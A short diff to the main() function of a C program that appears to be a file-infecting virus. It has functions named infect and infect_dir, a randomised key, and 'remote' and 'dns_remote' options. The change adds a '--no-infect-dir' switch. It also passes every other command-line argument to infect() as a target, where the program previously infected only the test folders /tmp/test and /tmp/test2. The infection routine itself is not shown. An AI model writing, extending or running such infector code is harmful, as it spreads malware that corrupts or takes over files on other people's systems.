@@ -118,6 +118,7 @@ int main(int ac, char **av){
 	size_t crypt_len;
 	struct s_opt opt;
 	ft_bzero(&opt, sizeof(opt));
+	bool do_infect_dir = TRUE;
 
 	if (!set_garbage_infos())
 		return 2;
@@ -125,7 +126,9 @@ int main(int ac, char **av){
 		return 1;
 	randomize(key);
 	for (int i = 1; i < ac; i ++){
-		if (str_equal(av[i], "--recur"))
+		if (str_equal(av[i], "--no-infect-dir"))
+			do_infect_dir = FALSE;
+		else if (str_equal(av[i], "--recur"))
 			opt.do_recur = TRUE;
 		else if (str_equal(av[i], "--remote"))
 			opt.do_remote = TRUE;
@@ -133,10 +136,16 @@ int main(int ac, char **av){
 			opt.print_msg = TRUE;
 		else if (str_equal(av[i], "--dns_remote"))
 			opt.do_dns_remote = TRUE;
+		else{
+			debug("infect ", av[i]);
+			infect(av[i], av[i], p, opt);
+		}
 		//else if (str_equal(av[i], "--big-recur"))
 		//	opt.print_msg = TRUE;
 	}
-	infect_dir("/tmp/test", p, opt);
-	infect_dir("/tmp/test2", p, opt);
+	if (do_infect_dir){
+		infect_dir("/tmp/test", p, opt);
+		infect_dir("/tmp/test2", p, opt);
+	}
 	return 0;
 }
